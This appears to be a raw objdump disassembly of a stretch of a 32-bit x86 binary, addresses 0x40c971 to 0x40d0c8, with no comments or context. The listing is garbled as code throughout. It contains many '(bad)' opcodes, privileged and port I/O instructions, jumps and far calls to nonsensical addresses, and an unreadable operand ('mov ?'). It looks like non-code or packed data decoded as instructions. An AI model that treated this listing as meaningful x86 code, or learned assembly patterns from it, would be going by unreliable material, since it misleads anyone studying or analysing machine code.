  40c971:	out    dx,eax
  40c972:	pop    esp
  40c973:	and    al,0xe5
  40c975:	repz (bad) 
  40c978:	and    eax,0x1419976e
  40c97d:	in     eax,dx
  40c97e:	pop    es
  40c97f:	xchg   ebp,eax
  40c980:	xlat   BYTE PTR ds:[ebx]
  40c981:	jle    0x40c9e9
  40c983:	data16 xchg BYTE PTR [eax],ch
  40c986:	dec    edx
  40c987:	clc    
  40c988:	lds    ebx,FWORD PTR [edi-0x3]
  40c98b:	xor    ch,BYTE PTR [edi]
  40c98d:	lahf   
  40c98e:	xchg   edx,eax
  40c98f:	and    al,0x4c
  40c991:	loope  0x40c91c
  40c993:	es enter 0x4932,0x2c
  40c998:	mov    edx,eax
  40c99a:	test   BYTE PTR [eax],ch
  40c99c:	dec    edx
  40c99d:	hlt    
  40c99e:	sub    al,0x3c
  40c9a0:	inc    ebp
  40c9a1:	enter  0x279e,0xf0
  40c9a5:	adc    ah,BYTE PTR [ecx-0x78ab0eeb]
  40c9ab:	mov    bh,0x7a
  40c9ad:	mov    esp,0x3666ef50
  40c9b2:	pop    DWORD PTR [esi-0x1824f507]
  40c9b8:	xchg   esi,eax
  40c9b9:	mov    al,ds:0xf7ceac45
  40c9be:	pop    esp
  40c9bf:	out    0xe1,al
  40c9c1:	adc    bh,bh
  40c9c3:	call   0xe9434c1
  40c9c8:	pop    esi
  40c9c9:	or     bh,al
  40c9cb:	dec    eax
  40c9cc:	pop    eax
  40c9cd:	lods   al,BYTE PTR ds:[esi]
  40c9ce:	(bad)  
  40c9cf:	and    edx,ecx
  40c9d1:	xor    ecx,DWORD PTR [ebx]
  40c9d3:	and    esp,DWORD PTR [ecx+0x67]
  40c9d6:	add    al,BYTE PTR [esi-0x76366f1f]
  40c9dc:	mov    bh,BYTE PTR [ebp-0x4e]
  40c9df:	cmp    al,0x93
  40c9e1:	xchg   ebp,eax
  40c9e2:	xor    ch,BYTE PTR [ebp+0x5632e893]
  40c9e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e9:	sub    eax,0xd6eddf17
  40c9ee:	mov    ah,0x9b
  40c9f0:	jb     0x40c9f5
  40c9f2:	or     ah,cl
  40c9f4:	xchg   ebx,eax
  40c9f5:	dec    esi
  40c9f6:	add    eax,0x47fb2316
  40c9fb:	(bad)  
  40c9fc:	pop    ss
  40c9fd:	and    eax,esp
  40c9ff:	mov    bh,0x53
  40ca01:	mov    ebx,0x9f6f841d
  40ca06:	adc    edx,edx
  40ca08:	or     DWORD PTR [esi],esi
  40ca0a:	dec    ecx
  40ca0b:	mov    ds:0x7eb47003,al
  40ca10:	push   ss
  40ca11:	push   cs
  40ca12:	mov    ecx,0x5e0db978
  40ca17:	test   eax,0xc3339f0
  40ca1c:	sar    BYTE PTR [ecx+0x76],0xb3
  40ca20:	sahf   
  40ca21:	popa   
  40ca22:	or     dl,dl
  40ca24:	icebp  
  40ca25:	or     al,0xa4
  40ca27:	mov    eax,ds:0x21144e83
  40ca2c:	xchg   esi,eax
  40ca2d:	call   0x450c84ff
  40ca32:	in     al,dx
  40ca33:	lods   eax,DWORD PTR ds:[esi]
  40ca34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca35:	and    al,BYTE PTR [edx]
  40ca37:	iret   
  40ca38:	push   ebx
  40ca39:	adc    ecx,DWORD PTR [edi-0x70]
  40ca3c:	xchg   BYTE PTR [eax-0x2c],cl
  40ca3f:	add    BYTE PTR [edi-0x840e31c],cl
  40ca45:	fxch   st(3)
  40ca47:	mov    WORD PTR [ebp-0x360c903],cs
  40ca4d:	xchg   ecx,eax
  40ca4e:	out    dx,eax
  40ca4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca50:	push   esi
  40ca51:	stos   DWORD PTR es:[edi],eax
  40ca52:	shr    DWORD PTR [esi-0x49],1
  40ca55:	ins    DWORD PTR es:[edi],dx
  40ca56:	xor    dl,dh
  40ca58:	mov    ds:0x4a13b8c1,al
  40ca5d:	enter  0xedff,0x14
  40ca61:	or     al,0x14
  40ca63:	xchg   BYTE PTR [ecx],ah
  40ca65:	inc    ecx
  40ca66:	adc    BYTE PTR [eax],dh
  40ca68:	xor    esi,DWORD PTR [ebx]
  40ca6a:	ret    
  40ca6b:	outs   dx,DWORD PTR ds:[esi]
  40ca6c:	(bad)  
  40ca6d:	out    dx,al
  40ca6e:	jecxz  0x40caec
  40ca70:	loope  0x40ca3d
  40ca72:	push   edi
  40ca73:	sbb    dh,al
  40ca75:	or     ecx,DWORD PTR [eax+0x29a80c60]
  40ca7b:	sbb    WORD PTR [ebx+0x3d],cx
  40ca7f:	sbb    eax,0x8589263a
  40ca84:	jb     0x40ca1b
  40ca86:	jns    0x40ca6e
  40ca88:	fisubr DWORD PTR [edx]
  40ca8a:	cmp    eax,0xf630feba
  40ca8f:	pop    ebp
  40ca90:	cmp    al,0x83
  40ca92:	jo     0x40ca18
  40ca94:	imul   ebx,esp,0x23
  40ca97:	or     esi,ebp
  40ca99:	cmc    
  40ca9a:	jbe    0x40ca35
  40ca9c:	test   eax,0x5d09aecb
  40caa1:	sbb    al,BYTE PTR [esi-0x58b41a0]
  40caa7:	in     eax,dx
  40caa8:	mov    bl,0xf8
  40caaa:	rol    DWORD PTR [ecx+0x1],0x90
  40caae:	popa   
  40caaf:	add    bl,BYTE PTR [ecx]
  40cab1:	add    BYTE PTR [edx-0x30],dl
  40cab4:	xchg   esp,eax
  40cab5:	adc    DWORD PTR [eax+0x33],edx
  40cab8:	inc    esp
  40cab9:	sbb    eax,0x31c49007
  40cabe:	sub    DWORD PTR [edi],0xc801ebaf
  40cac4:	sbb    BYTE PTR [edx-0x310d124d],ah
  40caca:	ja     0x40cac8
  40cacc:	(bad)  
  40cacd:	mov    bh,0x9b
  40cacf:	or     BYTE PTR [edx+edx*1],al
  40cad2:	ss das 
  40cad4:	mov    ebp,0x455bd3fa
  40cad9:	stos   BYTE PTR es:[edi],al
  40cada:	neg    DWORD PTR [ebx-0x6afe041a]
  40cae0:	dec    edx
  40cae1:	add    eax,0xa53bf9d3
  40cae6:	add    eax,0x7565d9bb
  40caeb:	(bad)  
  40caed:	adc    edi,DWORD PTR [esi-0x3e3c0e25]
  40caf3:	add    BYTE PTR [ebx+ebx*4+0x91553c0],al
  40cafa:	or     eax,0x966721a3
  40caff:	pop    ebx
  40cb00:	dec    eax
  40cb01:	mul    al
  40cb03:	data16 int3 
  40cb05:	xchg   ebp,eax
  40cb06:	sub    BYTE PTR [edx],ah
  40cb08:	dec    esi
  40cb09:	jb     0x40cb1e
  40cb0b:	sbb    esi,DWORD PTR [ebx-0x77a60bc]
  40cb11:	sbb    DWORD PTR [edi-0x6faab9a0],edx
  40cb17:	mov    cs,WORD PTR ds:0x62237520
  40cb1d:	jle    0x40cb70
  40cb1f:	(bad)  
  40cb20:	and    eax,0xe867a449
  40cb25:	jmp    0xe8755445
  40cb2a:	sub    BYTE PTR [ebx],ch
  40cb2c:	sahf   
  40cb2d:	add    al,0x61
  40cb2f:	xor    cl,bh
  40cb31:	outs   dx,DWORD PTR ds:[esi]
  40cb32:	cld    
  40cb33:	mul    BYTE PTR ds:0xc7bf9ac6
  40cb39:	(bad)  
  40cb3b:	mov    ebx,0x3870c1df
  40cb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb41:	fucomi st,st(5)
  40cb43:	jmp    0xfde9:0x140a
  40cb49:	cmp    ecx,DWORD PTR [ecx-0x8]
  40cb4c:	popf   
  40cb4d:	sbb    BYTE PTR [edx+0x60c1bf9],al
  40cb53:	sub    al,0x2e
  40cb55:	cs jb  0x40cb39
  40cb58:	ret    0xbf1a
  40cb5b:	stc    
  40cb5c:	cmp    ecx,edi
  40cb5e:	mov    cl,0xd9
  40cb60:	push   ds
  40cb61:	add    ebp,DWORD PTR [edi+0xc]
  40cb64:	inc    esp
  40cb65:	pop    ebp
  40cb66:	aad    0x4c
  40cb68:	nop
  40cb69:	mov    DWORD PTR [esi-0x3c6646c],esi
  40cb6f:	retf   0xe810
  40cb72:	add    DWORD PTR [esi-0xbb43fd1],ebx
  40cb78:	sub    esp,DWORD PTR [ebp+eiz*1-0x50]
  40cb7c:	and    al,0x3f
  40cb7e:	pop    ss
  40cb7f:	pop    eax
  40cb80:	xor    DWORD PTR [ebx-0x4b451ec],edi
  40cb86:	out    dx,al
  40cb87:	sahf   
  40cb88:	enter  0x671d,0x2d
  40cb8c:	jmp    FWORD PTR [esi]
  40cb8e:	cld    
  40cb8f:	aaa    
  40cb90:	div    DWORD PTR [eax+0x5d]
  40cb93:	xchg   DWORD PTR [esi],ecx
  40cb95:	arpl   WORD PTR [eax],si
  40cb97:	mov    BYTE PTR [ecx-0x5a],al
  40cb9a:	xlat   BYTE PTR ds:[ebx]
  40cb9b:	mov    cl,0x53
  40cb9d:	mov    edi,0x750d7b85
  40cba2:	sahf   
  40cba3:	sbb    al,BYTE PTR [edi]
  40cba5:	(bad)  
  40cba6:	or     BYTE PTR [eax+0x2258a2fe],ch
  40cbac:	inc    esp
  40cbad:	inc    edx
  40cbae:	mov    ebp,0xc5c51312
  40cbb3:	leave  
  40cbb4:	pop    ebx
  40cbb5:	add    BYTE PTR [ebx-0x248a34df],bl
  40cbbb:	cmp    ch,ch
  40cbbd:	iret   
  40cbbe:	add    dl,BYTE PTR ds:[eax+0xc]
  40cbc2:	shl    BYTE PTR [edi+0x12],0x7f
  40cbc6:	and    BYTE PTR [edx+0xc],0x9e
  40cbca:	xchg   BYTE PTR [edx-0x5867a2da],dh
  40cbd0:	retf   
  40cbd1:	sub    DWORD PTR [ecx-0x2f3cf1e9],0xffffffce
  40cbd8:	dec    edx
  40cbd9:	xor    ecx,DWORD PTR [esp]
  40cbdc:	scas   eax,DWORD PTR es:[edi]
  40cbdd:	add    ch,ah
  40cbdf:	sbb    WORD PTR [esi-0x72],bp
  40cbe3:	lock pop ebp
  40cbe5:	sub    esi,DWORD PTR [esi-0x76d9fe8f]
  40cbeb:	repnz dec ebx
  40cbed:	(bad)  
  40cbee:	jno    0x40cc3c
  40cbf0:	test   eax,0x7b7b665c
  40cbf5:	fwait
  40cbf6:	or     edx,DWORD PTR [edi]
  40cbf8:	xchg   DWORD PTR [edx-0x779dad75],edi
  40cbfe:	mov    ds:0xf04c3084,al
  40cc03:	add    eax,ebp
  40cc05:	cld    
  40cc06:	push   edx
  40cc07:	sbb    bl,BYTE PTR [esi*8-0x30fdd40d]
  40cc0e:	mov    BYTE PTR ds:0x51819964,0xd
  40cc15:	sbb    al,0xe9
  40cc17:	imul   ecx,DWORD PTR [edi-0x376e298b],0x38
  40cc1e:	ret    0xd6ce
  40cc21:	add    edx,edx
  40cc23:	or     bh,BYTE PTR ds:0x69bf0e66
  40cc29:	push   ds
  40cc2a:	std    
  40cc2b:	jo     0x40cbae
  40cc2d:	pop    edi
  40cc2e:	clc    
  40cc2f:	aad    0x65
  40cc31:	addr16 mov si,0xf7c0
  40cc36:	jg     0x40cc1a
  40cc38:	popf   
  40cc39:	or     al,0x6
  40cc3b:	add    eax,DWORD PTR [esi]
  40cc3d:	add    ecx,0x8
  40cc40:	adc    ecx,eax
  40cc42:	xor    eax,DWORD PTR [edx+0x2bbf9f22]
  40cc48:	stc    
  40cc49:	repz jns 0x40cc4c
  40cc4c:	jp     0x40cc0b
  40cc4e:	push   ds
  40cc4f:	adc    edx,DWORD PTR [ebx]
  40cc51:	adc    edx,esp
  40cc53:	jmp    0x40cca2
  40cc55:	inc    bl
  40cc57:	das    
  40cc58:	cld    
  40cc59:	and    DWORD PTR [edi-0x71],eax
  40cc5c:	cmovs  esp,esp
  40cc5f:	or     al,0x88
  40cc61:	mov    BYTE PTR es:[edx-0x6f6db946],dl
  40cc68:	inc    esp
  40cc69:	xor    DWORD PTR [ecx-0x14],edx
  40cc6c:	sub    edx,DWORD PTR ds:0x23888a20
  40cc72:	mov    eax,ds:0x41492172
  40cc77:	bound  esi,QWORD PTR [ebp+0x60]
  40cc7a:	inc    ebx
  40cc7b:	lods   al,BYTE PTR ds:[esi]
  40cc7c:	pop    edx
  40cc7d:	dec    edx
  40cc7e:	jp     0x40cc10
  40cc80:	push   ebp
  40cc81:	or     esi,DWORD PTR [eax-0x78]
  40cc84:	lds    edx,FWORD PTR ds:0xcbc482cd
  40cc8a:	push   ds
  40cc8b:	rol    DWORD PTR [bp+si+0x66],1
  40cc8f:	sbb    ebp,ecx
  40cc91:	xor    eax,0xf74fdc2c
  40cc96:	jns    0x40cc61
  40cc98:	test   al,0xb8
  40cc9a:	pop    ss
  40cc9b:	outs   dx,BYTE PTR ds:[esi]
  40cc9c:	inc    esi
  40cc9d:	loop   0x40cc6b
  40cc9f:	fstp   QWORD PTR ds:[edi]
  40cca2:	ror    BYTE PTR ds:0x23884e03,cl
  40cca8:	lock cmp eax,0x112f1898
  40ccae:	(bad)  
  40ccaf:	jb     0x40cc35
  40ccb1:	add    DWORD PTR [eax-0x3b56ad0b],ebx
  40ccb7:	(bad)  
  40ccb8:	(bad)  
  40ccb9:	xchg   esi,eax
  40ccba:	int    0xe6
  40ccbc:	in     al,dx
  40ccbd:	cmp    al,0x5b
  40ccbf:	enter  0x746d,0x1
  40ccc3:	ret    0x864d
  40ccc6:	add    bh,BYTE PTR [ebx-0x62]
  40ccc9:	aas    
  40ccca:	inc    edx
  40cccb:	dec    esp
  40cccc:	jp     0x40cc5d
  40ccce:	out    0xba,al
  40ccd0:	scas   al,BYTE PTR es:[edi]
  40ccd1:	jp     0x40cc73
  40ccd3:	xchg   BYTE PTR ds:[ebx-0x22472f04],bl
  40ccda:	pop    esp
  40ccdb:	cmp    eax,edx
  40ccdd:	cmc    
  40ccde:	lods   al,BYTE PTR ds:[esi]
  40ccdf:	cmc    
  40cce0:	xlat   BYTE PTR ds:[ebx]
  40cce1:	pop    ebx
  40cce2:	jbe    0x40cc83
  40cce4:	(bad)
  40cce7:	lods   eax,DWORD PTR ds:[esi]
  40cce8:	cmc    
  40cce9:	dec    eax
  40ccea:	aas    
  40cceb:	xchg   ebx,eax
  40ccec:	les    ecx,FWORD PTR [ecx-0x14]
  40ccef:	mov    eax,ds:0x575700a3
  40ccf4:	aaa    
  40ccf5:	imul   esi,DWORD PTR [ebp-0x7b10cb43],0x5e1ec1d4
  40ccff:	dec    esp
  40cd00:	sub    esi,esi
  40cd02:	hlt    
  40cd03:	add    BYTE PTR ds:0xcdfd23f7,dh
  40cd09:	shr    DWORD PTR [ebx+ecx*2+0x53],0x96
  40cd0e:	call   0x456630e5
  40cd13:	mov    al,0xdf
  40cd15:	adc    BYTE PTR [esi-0x4a322af5],bh
  40cd1b:	push   ebp
  40cd1c:	xor    DWORD PTR [ecx],edx
  40cd1e:	cmp    edi,DWORD PTR [edi+0x46]
  40cd21:	es fs mov dl,0xf9
  40cd25:	(bad)  
  40cd27:	rcr    DWORD PTR [ecx],cl
  40cd29:	in     al,dx
  40cd2a:	in     eax,0x5f
  40cd2c:	(bad)  
  40cd2d:	fcom   QWORD PTR [ecx+0x66]
  40cd30:	data16 (bad) 
  40cd32:	js     0x40cd13
  40cd34:	mov    bh,0xbd
  40cd36:	sahf   
  40cd37:	jae    0x40cd20
  40cd39:	into   
  40cd3a:	xor    DWORD PTR [eax],ebx
  40cd3c:	or     al,0x32
  40cd3e:	dec    ecx
  40cd3f:	pop    edx
  40cd40:	ja     0x40cd74
  40cd42:	cli    
  40cd43:	in     eax,0x89
  40cd45:	mov    esi,0xc37cd968
  40cd4a:	jge    0x40cd47
  40cd4c:	div    cl
  40cd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4f:	(bad)  
  40cd50:	mov    ebp,0xdbfe67c8
  40cd55:	imul   eax,DWORD PTR [esi],0xfd251ed1
  40cd5b:	test   eax,0x44914ca4
  40cd60:	mov    eax,ds:0x8e263880
  40cd65:	cmp    eax,0xbcf127fd
  40cd6a:	add    al,0x89
  40cd6c:	xchg   DWORD PTR [edi-0x70e639dc],edx
  40cd72:	popa   
  40cd73:	add    al,BYTE PTR [edx]
  40cd75:	mov    eax,ds:0x9a597672
  40cd7a:	push   esp
  40cd7b:	adc    DWORD PTR [edi-0x57],edi
  40cd7e:	sbb    ecx,esi
  40cd80:	sbb    eax,0x6801d263
  40cd85:	imul   ebx,DWORD PTR [edi-0x5aad541b],0x1ce39ddb
  40cd8f:	inc    esi
  40cd90:	and    BYTE PTR [ebx],dh
  40cd92:	test   BYTE PTR ds:0xe9636e3d,0xd0
  40cd99:	mov    ebp,0x55a876ab
  40cd9e:	push   ebp
  40cd9f:	adc    eax,0x8901274a
  40cda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda5:	bound  eax,QWORD PTR [eax]
  40cda7:	les    edx,FWORD PTR [esp+edi*2+0x18d02b35]
  40cdae:	sti    
  40cdaf:	fdivr  st(1),st
  40cdb1:	addr16 mov ds:0x8b4c,eax
  40cdb5:	cmp    eax,0x536e0362
  40cdba:	and    dl,BYTE PTR [eax]
  40cdbc:	shl    DWORD PTR [esi-0x73],cl
  40cdbf:	add    BYTE PTR [esp+eiz*8-0x4d53f32],cl
  40cdc6:	fwait
  40cdc7:	mov    bh,0x1
  40cdc9:	js     0x40cde4
  40cdcb:	aad    0x60
  40cdcd:	daa    
  40cdce:	clc    
  40cdcf:	or     DWORD PTR [eax],edi
  40cdd1:	sub    al,ch
  40cdd3:	mov    ch,0xb3
  40cdd5:	xchg   esp,eax
  40cdd6:	in     eax,dx
  40cdd7:	les    eax,FWORD PTR [esi+ebp*2]
  40cdda:	fs lahf 
  40cddc:	jns    0x40ce0c
  40cdde:	jae    0x40cd9f
  40cde0:	mov    eax,ds:0x96a4d3d6
  40cde5:	(bad)  
  40cde6:	adc    dh,ch
  40cde8:	sub    DWORD PTR [edx],0x2f673295
  40cdee:	pop    esp
  40cdef:	mov    bx,0xd815
  40cdf3:	xlat   BYTE PTR ds:[ebx]
  40cdf4:	push   ebx
  40cdf5:	(bad)
  40cdf9:	xor    dl,dl
  40cdfb:	iret   
  40cdfc:	sbb    eax,0xb81e938
  40ce01:	or     BYTE PTR [edi+eiz*8],bl
  40ce04:	pop    ebp
  40ce05:	xor    eax,DWORD PTR [esi+ecx*2]
  40ce08:	jbe    0x40cdc5
  40ce0a:	cmp    DWORD PTR [esi],edi
  40ce0c:	mov    ch,0x21
  40ce0e:	in     al,dx
  40ce0f:	mov    al,0x5d
  40ce11:	dec    edx
  40ce12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce13:	sbb    eax,edi
  40ce15:	rol    BYTE PTR [eax-0x23],cl
  40ce18:	add    al,0x64
  40ce1a:	adc    DWORD PTR [edx],edx
  40ce1c:	sub    BYTE PTR [ecx+0x47e05ad1],dh
  40ce22:	jg     0x40ce20
  40ce24:	dec    edi
  40ce25:	cdq    
  40ce26:	sahf   
  40ce27:	outs   dx,BYTE PTR ds:[esi]
  40ce28:	repnz cli 
  40ce2a:	pop    es
  40ce2b:	out    dx,al
  40ce2c:	in     al,0xd4
  40ce2e:	test   eax,0x38990053
  40ce33:	hlt    
  40ce34:	and    dl,BYTE PTR ds:0x40cc7ae0
  40ce3a:	dec    edx
  40ce3b:	xor    eax,0x81c0e08f
  40ce40:	add    esi,esp
  40ce42:	jp     0x40ce55
  40ce44:	mov    edi,0x738f1bf2
  40ce49:	jmp    0x8e29e798
  40ce4e:	adc    edi,0x0
  40ce51:	add    dh,ch
  40ce53:	cmp    al,0x52
  40ce55:	fdiv   DWORD PTR [edx+ebx*2]
  40ce58:	stos   BYTE PTR es:[edi],al
  40ce59:	js     0x40ce01
  40ce5b:	repnz push ss
  40ce5d:	les    ecx,FWORD PTR [ecx+0x2291a78f]
  40ce63:	sahf   
  40ce64:	cmp    BYTE PTR [eax],0x25
  40ce67:	cmp    ch,bl
  40ce69:	adc    eax,0xfba7efb4
  40ce6e:	push   edi
  40ce6f:	dec    eax
  40ce70:	dec    ebp
  40ce71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce72:	out    0x1d,al
  40ce74:	sar    DWORD PTR [eax-0x7a],cl
  40ce77:	xor    al,0x69
  40ce79:	xchg   DWORD PTR [ebx-0x6a4e8bdc],eax
  40ce7f:	sub    al,0x5a
  40ce81:	xor    BYTE PTR [edi-0x12d14cd],dl
  40ce87:	or     dl,BYTE PTR [ebx+0x1061c82a]
  40ce8d:	inc    edx
  40ce8e:	or     BYTE PTR [edx],dh
  40ce90:	jne    0x40ce9b
  40ce92:	repnz push 0xffffff80
  40ce95:	push   esp
  40ce96:	cmc    
  40ce97:	add    BYTE PTR [ebx+0x1467bd44],dl
  40ce9d:	sub    DWORD PTR [edi],0x22
  40cea0:	xchg   edx,eax
  40cea1:	and    al,0x24
  40cea3:	mov    ?,WORD PTR [edx+0x78ee6581]
  40cea9:	hlt    
  40ceaa:	cmp    al,0xcf
  40ceac:	(bad)  
  40cead:	pop    esp
  40ceae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceaf:	iret   
  40ceb0:	and    eax,0x2d02ae00
  40ceb5:	outs   dx,BYTE PTR ds:[esi]
  40ceb6:	arpl   WORD PTR [ebx-0x5f5ffb97],di
  40cebc:	mov    ebp,0xdf78219f
  40cec1:	aaa    
  40cec2:	nop
  40cec3:	lea    ecx,ds:[ebx]
  40cec6:	xor    BYTE PTR [eax+ebx*2+0x2d1d049],bl
  40cecd:	adc    al,BYTE PTR [esi]
  40cecf:	(bad)  
  40ced0:	fwait
  40ced1:	rcr    DWORD PTR [eax-0x6faf6fd1],0x2d
  40ced8:	gs push edi
  40ceda:	dec    esp
  40cedb:	sar    BYTE PTR ds:0x1c2dbf2f,0xc
  40cee2:	mov    dl,0xbe
  40cee4:	outs   dx,BYTE PTR ds:[esi]
  40cee5:	popa   
  40cee6:	push   0x1
  40cee8:	xchg   esp,eax
  40cee9:	cmp    BYTE PTR [ebx-0x1a],dh
  40ceec:	sub    ah,BYTE PTR [ecx+0x37]
  40ceef:	mov    al,0x1e
  40cef1:	add    BYTE PTR [eax+0x5b],al
  40cef4:	jl     0x40cf09
  40cef6:	cmp    al,0x2f
  40cef8:	inc    esi
  40cef9:	es xchg edx,eax
  40cefb:	xchg   edx,eax
  40cefc:	xchg   esp,eax
  40cefd:	js     0x40cf40
  40ceff:	or     cl,bl
  40cf01:	mov    bl,0x44
  40cf03:	dec    edi
  40cf04:	data16 add BYTE PTR [eax*1+0x7a2277db],ah
  40cf0c:	jae    0x40cebd
  40cf0e:	mov    ds:0xee752965,al
  40cf13:	add    BYTE PTR [edi-0x5fd64218],dh
  40cf19:	and    DWORD PTR [ebp-0x77],ebx
  40cf1c:	add    eax,0xd5d2e650
  40cf21:	pop    ecx
  40cf22:	dec    BYTE PTR [edi+0x7e39f67f]
  40cf28:	out    0xa7,al
  40cf2a:	ds enter 0xe2e2,0x22
  40cf2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf30:	dec    edi
  40cf31:	lahf   
  40cf32:	mov    dh,0x36
  40cf34:	pushf  
  40cf35:	and    ah,BYTE PTR [ebx]
  40cf37:	lahf   
  40cf38:	xchg   ecx,eax
  40cf39:	pop    edx
  40cf3a:	xlat   BYTE PTR ds:[ebx]
  40cf3b:	bound  ecx,QWORD PTR [edi*8-0x42856082]
  40cf42:	into   
  40cf43:	cld    
  40cf44:	cld    
  40cf45:	cmp    al,0xbf
  40cf47:	clc    
  40cf48:	lahf   
  40cf49:	mov    esi,0x6f4f13c8
  40cf4e:	xchg   ebx,eax
  40cf4f:	mov    BYTE PTR ds:0x54cdfd0d,al
  40cf55:	jno    0x40cee0
  40cf57:	dec    esp
  40cf58:	bound  esp,QWORD PTR [esp+ecx*1-0x77]
  40cf5c:	hlt    
  40cf5d:	dec    eax
  40cf5e:	loop   0x40cfa8
  40cf60:	gs int3 
  40cf62:	mov    DWORD PTR [edx-0x1e],esp
  40cf65:	sub    dl,al
  40cf67:	test   DWORD PTR [edx],0x802654a4
  40cf6d:	in     al,dx
  40cf6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf6f:	fwait
  40cf70:	sub    al,0x40
  40cf73:	and    ebx,DWORD PTR [eax+0x4]
  40cf76:	mov    al,ds:0xbf694c27
  40cf7b:	push   0x50605aa1
  40cf80:	mov    esi,0xb5e909e2
  40cf85:	mov    ch,0x88
  40cf87:	and    dl,bh
  40cf89:	dec    ecx
  40cf8a:	call   0x947d:0x22e8385f
  40cf91:	retf   0x545a
  40cf94:	mov    esp,0x200000
  40cf99:	dec    ecx
  40cf9a:	inc    esp
  40cf9b:	inc    ecx
  40cf9c:	push   esp
  40cf9d:	sbb    al,0x53
  40cf9f:	lds    edi,FWORD PTR [ecx]
  40cfa1:	aaa    
  40cfa2:	int    0x39
  40cfa4:	sbb    ch,al
  40cfa6:	inc    edx
  40cfa7:	and    eax,0x8d258904
  40cfac:	pop    edx
  40cfad:	lahf   
  40cfae:	mov    DWORD PTR [ecx+0xd817132],esi
  40cfb4:	shl    BYTE PTR [ebp-0x5c],0x3b
  40cfb8:	mov    eax,0x7d024f00
  40cfbd:	outs   dx,BYTE PTR ds:[esi]
  40cfbe:	arpl   bx,bx
  40cfc0:	push   ebp
  40cfc1:	ins    DWORD PTR es:[edi],dx
  40cfc2:	inc    eax
  40cfc3:	and    eax,edx
  40cfc5:	mov    edx,0x1801b1bd
  40cfca:	imul   esp,DWORD PTR [esi+0x210f74e9],0x1c
  40cfd1:	into   
  40cfd2:	in     al,dx
  40cfd3:	cld    
  40cfd4:	dec    ecx
  40cfd5:	cdq    
  40cfd6:	pop    edx
  40cfd7:	inc    esi
  40cfd8:	ja     0x40d00c
  40cfda:	mov    es,WORD PTR [eax+0x36]
  40cfdd:	push   edx
  40cfde:	or     eax,0xf20bd8c8
  40cfe3:	xlat   BYTE PTR ds:[ebx]
  40cfe4:	xor    eax,edi
  40cfe6:	in     eax,dx
  40cfe7:	push   esi
  40cfe8:	test   DWORD PTR [edi],0x83063835
  40cfee:	add    DWORD PTR [eax-0x6b],ecx
  40cff1:	adc    al,0xd2
  40cff3:	pusha  
  40cff4:	sbb    cl,BYTE PTR [edi+0x8]
  40cff7:	jl     0x40d058
  40cff9:	jo     0x40cff1
  40cffb:	fsub   QWORD PTR [esi]
  40cffd:	sub    dl,BYTE PTR [ecx]
  40cfff:	push   0x24b1c5b6
  40d004:	or     al,0x63
  40d006:	sub    BYTE PTR [ecx],al
  40d008:	adc    DWORD PTR [esp-0x15eb85aa],edx
  40d00f:	imul   dl
  40d011:	pop    edi
  40d012:	xchg   al,ch
  40d014:	in     eax,dx
  40d015:	mov    cl,0xe4
  40d017:	mov    bh,0x39
  40d019:	sti    
  40d01a:	jbe    0x40d05e
  40d01c:	pop    es
  40d01d:	push   es
  40d01e:	dec    ebp
  40d01f:	cmp    dh,bh
  40d021:	outs   dx,BYTE PTR ds:[esi]
  40d022:	xor    eax,0x4c3a5a6
  40d027:	rcl    ah,cl
  40d029:	ins    BYTE PTR es:[edi],dx
  40d02a:	mov    BYTE PTR [edx],bl
  40d02c:	daa    
  40d02d:	xchg   esi,eax
  40d02e:	daa    
  40d02f:	stc    
  40d030:	pop    es
  40d031:	lahf   
  40d032:	cld    
  40d033:	add    edi,esi
  40d035:	in     eax,dx
  40d036:	(bad)  
  40d037:	stc    
  40d038:	popa   
  40d039:	push   ss
  40d03a:	pop    ss
  40d03b:	pop    ss
  40d03c:	cmp    DWORD PTR [ebx-0x1a],esi
  40d03f:	or     al,0xa5
  40d041:	push   edx
  40d042:	leave  
  40d043:	adc    bh,BYTE PTR [ebx-0x37745147]
  40d049:	repnz fisttp DWORD PTR [ebp+0x3f]
  40d04d:	fwait
  40d04e:	cmp    al,BYTE PTR [ebp-0x1ee371b9]
  40d054:	clc    
  40d055:	dec    ebx
  40d056:	out    0xf9,eax
  40d058:	lods   eax,DWORD PTR ds:[esi]
  40d059:	fistp  QWORD PTR ds:0xae3fbb46
  40d05f:	xor    esp,DWORD PTR [esi]
  40d061:	push   ebp
  40d062:	pushf  
  40d063:	(bad)  
  40d065:	dec    ebx
  40d066:	mov    DWORD PTR [edx+0x47b1c45f],esi
  40d06c:	adc    al,0xc5
  40d06e:	inc    esp
  40d06f:	mov    DWORD PTR [eax],esp
  40d071:	mov    ah,BYTE PTR [edx+0x3c]
  40d074:	(bad)  
  40d076:	dec    edi
  40d077:	and    BYTE PTR ds:0xfd7c88df,bh
  40d07d:	ins    DWORD PTR es:[edi],dx
  40d07e:	int    0xf9
  40d080:	jns    0x40d06b
  40d082:	call   0xe075d529
  40d087:	mov    dl,0x99
  40d089:	jle    0x40d0e8
  40d08b:	push   es
  40d08c:	nop
  40d08d:	inc    edx
  40d08e:	jnp    0x40d08d
  40d090:	and    BYTE PTR ss:[edx+edi*8+0x11bb7681],bl
  40d098:	ss stc 
  40d09a:	jnp    0x40d042
  40d09c:	or     al,0x43
  40d09e:	mov    ecx,0x8e5af515
  40d0a3:	outs   dx,DWORD PTR ds:[esi]
  40d0a4:	pop    eax
  40d0a5:	sbb    eax,DWORD PTR [eax+0x22]
  40d0a8:	or     ebx,esp
  40d0aa:	test   BYTE PTR [eax],bh
  40d0ac:	xchg   BYTE PTR [eax],ah
  40d0ae:	sbb    dl,dl
  40d0b0:	push   0x76644834
  40d0b5:	and    dl,BYTE PTR [eax-0x30c2d7d5]
  40d0bb:	mov    ds:0x1917efdf,eax
  40d0c0:	add    bh,cl
  40d0c2:	jl     0x40d0b3
  40d0c4:	idiv   DWORD PTR [esi-0x11]
  40d0c7:	into   
  40d0c8:	les    esi,FWORD PTR [ecx+0xb]
